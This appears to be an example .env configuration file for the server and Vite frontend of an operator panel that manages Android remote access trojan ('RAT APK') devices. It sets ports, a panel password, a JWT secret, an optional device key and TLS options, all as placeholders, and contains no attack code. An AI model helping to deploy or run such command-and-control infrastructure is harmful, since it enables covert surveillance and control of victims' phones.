# ─── Backend server ────────────────────────────────────────
# Port for operator HTTP + WebSocket connections
PORT=3001

# Port for device (RAT APK) WebSocket connections
DEVICE_PORT=3002

# Panel login password
PANEL_PASSWORD=change_me_before_deploying

# JWT signing secret — use a long random string
JWT_SECRET=change_me_before_deploying_32chars_min

# Optional: pre-shared key for device connections
# Leave empty to skip device-side auth
DEVICE_SECRET=

# TLS (set to "true" and place key.pem + cert.pem in ./certs/)
USE_TLS=false
CERT_DIR=./certs

# ─── Frontend (Vite build-time) ────────────────────────────
# Override if backend is on a different host/port from frontend
# VITE_API_URL=http://your-vps-ip:3001/api
# VITE_WS_URL=ws://your-vps-ip:3001/ws/operator
